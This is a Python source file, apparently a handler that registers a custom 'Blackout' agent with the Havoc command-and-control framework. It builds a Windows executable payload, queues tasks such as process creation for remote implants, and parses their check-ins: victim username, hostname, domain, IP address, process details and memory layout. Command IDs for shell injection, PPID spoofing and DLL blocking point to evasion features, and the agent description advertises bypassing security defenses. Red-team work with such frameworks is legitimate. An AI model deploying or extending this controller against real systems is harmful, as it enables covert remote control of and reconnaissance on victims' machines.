from base64 import b64decode
from havoc.service import HavocService
from havoc.agent import *

import os

BLACKOUT_ERROR           = 0x099
BLACKOUT_DEBUG           = 0x066
BLACKOUT_CHECKIN         = 0x055
COMMAND_REGISTER         = 0x100
COMMAND_GET_JOB          = 0x101
COMMAND_NO_JOB           = 0x102
COMMAND_RUN              = 0x120
COMMAND_UPLOAD           = 0x153
COMMAND_DOWNLOAD         = 0x154
COMMAND_SHELLINJECT      = 0x161

COMMAND_SLEEP            = 0x111
COMMAND_PPID             = 0x140
COMMAND_BLOCKDLLS        = 0x141
COMMAND_EXITP            = 0x155
COMMAND_EXITT            = 0x156
COMMAND_PROCLIST         = 0x157
COMMAND_OUTPUT           = 0x200

# ====================
# ===== Commands =====
# ====================
class CommandCheckin( Command ):
    CommandId   = BLACKOUT_CHECKIN
    Name        = "checkin"
    Description = "retrieve several informations from agent, machine ans connection"
    Help        = ""
    NeedAdmin   = False
    Params = []
    Mitr = []

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )

        return Task.buffer

class CommandRun( Command ):
    CommandId   = COMMAND_RUN
    Name        = "run"
    Description = "create process with capabilities"
    Help        = ""
    NeedAdmin   = False
    Params = [
        CommandParam(
            name="process",
            is_file_path=False,
            is_optional=False
        )
    ]

    Mitr = []

    def job_generate( self, arguments:dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_data( arguments[ 'process' ] )

        return Task.buffer
    
class CommandExitThread( Command ):
    CommandId = COMMAND_EXITT

class CommandExitProcess( Command ):
    CommandId = COMMAND_EXITP

# =======================
# ===== Agent Class =====
# =======================
class Blackout(AgentType):
    Name = "blackout"
    Author = "__oblivion"
    Version = "0.1"
    Description = f"""Blackout in security defense solutions"""
    MagicValue = 0x74616c6e # 'blc'

    Arch = [
        "x64",
        "x86",
    ]

    Formats = [
        {
            "Name": "Windows Executable",
            "Extension": "exe"
        },
    ]

    BuildingConfig = {
        "Sleep": "10"
    }

    Commands = [
        CommandCheckin(),
        CommandRun()
    ]

    # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
    def generate( self, config: dict ) -> None:

        print( f"config: {config}" )

        # builder_send_message. this function send logs/messages to the payload build for verbose information or sending errors (if something went wrong).
        self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )

        # make and cmake
        os.system("make")

        # open .exe
        data = open("./Bin/blackout.exe", "rb").read()

        # build_send_payload. this function send back your generated payload
        self.builder_send_payload( config[ 'ClientID' ], self.Name + ".exe", data) # this is just an example.

    # this function handles incomming requests based on our magic value. you can respond to the agent by returning your data from this function.
    def response( self, response: dict ) -> bytes:

        agent_header    = response[ "AgentHeader" ]
        agent_response  = b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.
        response_parser = Parser( agent_response, len(agent_response) )
        Command         = response_parser.parse_int()

        if response[ "Agent" ] == None:
            # so when the Agent field is empty this either means that the agent doesn't exists.

            if Command == COMMAND_REGISTER:
                print( "[*] Is agent register request" )

                # Register info:
                #   - AgentID           : int [needed]
                #   - Hostname          : str [needed]
                #   - Username          : str [needed]
                #   - Domain            : str [optional]
                #   - InternalIP        : str [needed]
                #   - Process Path      : str [needed]
                #   - Process Name      : str [needed]
                #   - Process ID        : int [needed]
                #   - Process Parent ID : int [optional]
                #   - Process Arch      : str [needed]
                #   - Process Elevated  : int [needed]
                #   - OS Build          : str [needed]
                #   - OS Version        : str [needed]
                #   - OS Arch           : str [optional]
                #   - Sleep             : int [optional]

                RegisterInfo = {
                    "AgentID"           : response_parser.parse_int(),
                    "Hostname"          : response_parser.parse_str(),
                    "Username"          : response_parser.parse_str(),
                    "Domain"            : response_parser.parse_str(),
                    "InternalIP"        : response_parser.parse_str(),
                    "Process Path"      : response_parser.parse_wstr(),
                    "Process ID"        : str(response_parser.parse_int()),
                    "Process Parent ID" : str(response_parser.parse_int()),
                    "Process Arch"      : response_parser.parse_int(),
                    "Process Elevated"  : response_parser.parse_int(),
                    "OS Build"          : str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()), # (MajorVersion).(MinorVersion).(ProductType).(ServicePackMajor).(BuildNumber)
                    "OS Arch"           : response_parser.parse_int(),
                    "SleepDelay"        : response_parser.parse_int(),
                }

                RegisterInfo[ "Process Name" ] = RegisterInfo[ "Process Path" ].split( "\\" )[-1]

                # this OS info is going to be displayed on the GUI Session table.
                RegisterInfo[ "OS Version" ] = RegisterInfo[ "OS Build" ] # "Windows Some version"

                if RegisterInfo[ "OS Arch" ] == 0:
                    RegisterInfo[ "OS Arch" ] = "x86"
                elif RegisterInfo[ "OS Arch" ] == 9:
                    RegisterInfo[ "OS Arch" ] = "x64/AMD64"
                elif RegisterInfo[ "OS Arch" ] == 5:
                    RegisterInfo[ "OS Arch" ] = "ARM"
                elif RegisterInfo[ "OS Arch" ] == 12:
                    RegisterInfo[ "OS Arch" ] = "ARM64"
                elif RegisterInfo[ "OS Arch" ] == 6:
                    RegisterInfo[ "OS Arch" ] = "Itanium-based"
                else:
                    RegisterInfo[ "OS Arch" ] = "Unknown (" + RegisterInfo[ "OS Arch" ] + ")"

                # Process Arch
                if RegisterInfo[ "Process Arch" ] == 0:
                    RegisterInfo[ "Process Arch" ] = "Unknown"

                elif RegisterInfo[ "Process Arch" ] == 1:
                    RegisterInfo[ "Process Arch" ] = "x86"

                elif RegisterInfo[ "Process Arch" ] == 2:
                    RegisterInfo[ "Process Arch" ] = "x64"

                elif RegisterInfo[ "Process Arch" ] == 3:
                    RegisterInfo[ "Process Arch" ] = "IA64"

                self.register( agent_header, RegisterInfo )

                return RegisterInfo[ 'AgentID' ].to_bytes( 4, 'little' ) # return the agent id to the agent

            else:
                print( "[-] Is not agent register request" )
        else:
            print( f"[*] Something else: {Command}" )

            AgentID = response[ "Agent" ][ "NameID" ]

            if Command == COMMAND_GET_JOB:
                print( "[*] Get list of jobs and return it." )

                Tasks = self.get_task_queue( response[ "Agent" ] )

                # if there is no job just send back a COMMAND_NO_JOB command.
                if len(Tasks) == 0:
                    Tasks = COMMAND_NO_JOB.to_bytes( 4, 'little' )

                print( f"Tasks: {Tasks.hex()}" )
                return Tasks            

            elif Command == BLACKOUT_DEBUG:
                Output = response_parser.parse_str()
                self.console_message( AgentID, "Good", "%s\n", "" )

            elif Command == COMMAND_OUTPUT:

                Output = response_parser.parse_str()
                print( "[*] Output: \n" + Output )

                self.console_message( AgentID, "Good", "Received Output:", Output )

            elif Command == BLACKOUT_CHECKIN:
                bk_base   = response_parser.parse_int()
                bk_len    = response_parser.parse_int()
                bk_fullen = response_parser.parse_int()
                bk_rxbase = response_parser.parse_int()
                bk_rxsize = response_parser.parse_int()
                
                proc_name     = response_parser.parse_wstr()
                proc_fullpath = response_parser.parse_wstr()
                proc_cmdline  = response_parser.parse_wstr()
                proc_id       = response_parser.parse_int()
                proc_par_id   = response_parser.parse_int()

                username      = response_parser.parse_str()
                computername  = response_parser.parse_str()
                domainame     = response_parser.parse_str()
                netbios       = response_parser.parse_str()
                ipaddress     = response_parser.parse_str()
                osarch        = response_parser.parse_int()
                product_type  = response_parser.parse_int()
                osmajor       = response_parser.parse_int()
                osminor       = response_parser.parse_int()
                osbuildern    = response_parser.parse_int()

                Output = (
                    f"Blackout memory config:\n"
                    f"\t - Base Address: 0x{bk_base:X}\n"
                    f"\t - Length: {bk_len} | 0x{bk_len:X} bytes\n"
                    f"\t - Full Length: {bk_fullen} | 0x{bk_fullen:X} bytes\n"
                    f"\t - RX Base Address: 0x{bk_rxbase:X}\n"
                    f"\t - RX Size: {bk_rxsize} | 0x{bk_rxsize:X} bytes\n"
                    
                    f"\nProcess informations:\n"
                    f"\t - Process Name: {proc_name}\n"
                    f"\t - Full Path: {proc_fullpath}\n"
                    f"\t - Command Line: {proc_cmdline}\n"
                    f"\t - Process ID: {proc_id}\n"
                    f"\t - Parent Process ID: {proc_par_id}\n"
                    
                    f"\nSystem informations:\n"
                    f"\t - Username: {username}\n"
                    f"\t - Computer Name: {computername}\n"
                    f"\t - Domain Name: {domainame}\n"
                    f"\t - NetBIOS Name: {netbios}\n"
                    f"\t - IP Address: {ipaddress}\n"
                    f"\t - OS Architecture: {osarch}\n"
                    f"\t - Product Type: {'Workstation' if product_type == 1 else 'Server'}\n"
                    f"\t - OS Version: {osmajor}.{osminor}\n"
                    f"\t - OS Build Number: {osbuildern}\n"
                )

                self.console_message( AgentID, "Good", f"Received informations from agent:\n", Output )

            elif Command == COMMAND_RUN:
                bCheck = response_parser.parse_int()
                ProcId = response_parser.parse_int()
                ThdId  = response_parser.parse_int()

                Output = f"\t- Process ID: {ProcId}\n\t- Thread ID: {ThdId}"

                self.console_message( AgentID, "Good", f"Process create succefully:", Output )

    
            elif Command == BLACKOUT_ERROR:
                ErrCode = response_parser.parse_int() 
                ErrMsg  = response_parser.parse_str()

                self.console_message(AgentID, "Error", f"Windows Error: {hex(ErrCode)} ({ErrMsg})", "")   

            else:
                self.console_message( AgentID, "Error", "Command not found: %4x" % Command, "" )

        return b''

def main():
    Havoc_Blackout: Blackout = Blackout()

    print( "[*] Connect to Havoc service api" )
    Havoc_Service = HavocService(
        endpoint="wss://127.0.0.1:40056/service-endpoint",
        password="service-password"
    )

    print( "[*] Register Blackout to Havoc" )
    Havoc_Service.register_agent(Havoc_Blackout)

    return

if __name__ == '__main__':
    main()
